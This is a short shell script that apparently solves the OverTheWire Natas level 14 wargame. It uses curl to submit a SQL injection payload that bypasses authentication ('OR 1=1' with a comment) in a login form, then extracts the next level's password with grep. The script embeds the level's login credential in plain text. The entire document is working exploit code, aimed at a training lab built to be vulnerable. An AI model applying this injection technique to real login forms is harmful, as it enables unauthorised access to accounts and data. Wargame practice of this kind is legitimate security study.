#!/bin/sh

RESPONSE=$(curl --silent \
                --user natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 \
                --form "username=a\" OR 1=1 #" \
                http://natas14.natas.labs.overthewire.org/)
PASSWORD=$(echo $RESPONSE | grep -Po "(?<=The password for natas15 is )[A-Za-z0-9]{32}")
printf "The password for natas15 is: ${PASSWORD}\n"
